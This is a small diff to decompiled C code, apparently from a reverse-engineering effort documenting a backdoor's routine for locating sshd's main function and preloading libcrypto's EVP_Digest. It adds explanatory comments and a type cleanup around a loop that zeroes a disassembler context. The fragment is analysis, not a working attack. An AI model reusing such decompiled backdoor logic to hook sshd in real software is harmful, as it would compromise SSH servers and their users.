@@ -61,8 +61,9 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
       if (code_segment_end <= code_start + 0x200) {
         code_end = code_segment_end;
       }
+      // AutoDoc: Zero the disassembler context before scanning so every entry stub starts from a clean slate.
       for (; clear_idx != 0; clear_idx = clear_idx + -1) {
-        *(undefined4 *)&ctx_cursor->instruction = 0;
+        *(u32 *)&ctx_cursor->instruction = 0;
         ctx_cursor = (dasm_ctx_t *)((long)ctx_cursor + (ulong)zero_seed * -8 + 4);
       }
       // AutoDoc: Preload EVP_Digest before decoding so the import table is ready as soon as the entry point is confirmed.
